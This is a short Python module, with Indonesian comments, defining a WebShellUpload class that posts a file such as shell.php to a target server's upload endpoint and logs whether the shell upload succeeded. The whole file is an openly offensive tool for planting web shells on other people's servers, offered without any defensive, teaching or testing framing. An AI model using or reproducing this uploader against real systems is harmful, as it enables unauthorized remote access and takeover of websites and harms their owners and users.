import requests
import logging

logger = logging.getLogger(__name__)

class WebShellUpload:
    def __init__(self, target_url):
        self.target_url = target_url

    def upload_shell(self, file_path, target_path):
        """
        Mengupload web shell ke server target.
        """
        with open(file_path, 'rb') as file:
            files = {'file': (file_path, file)}
            try:
                response = requests.post(self.target_url + target_path, files=files)
                if "success" in response.text.lower():
                    logger.info(f"Shell uploaded successfully to {self.target_url + target_path}")
                else:
                    logger.info("Shell upload failed.")
            except Exception as e:
                logger.error(f"Error during shell upload: {str(e)}")

# Contoh penggunaan:
# webshell = WebShellUpload("http://example.com/upload")
# webshell.upload_shell("/path/to/shell.php", "/uploads/")
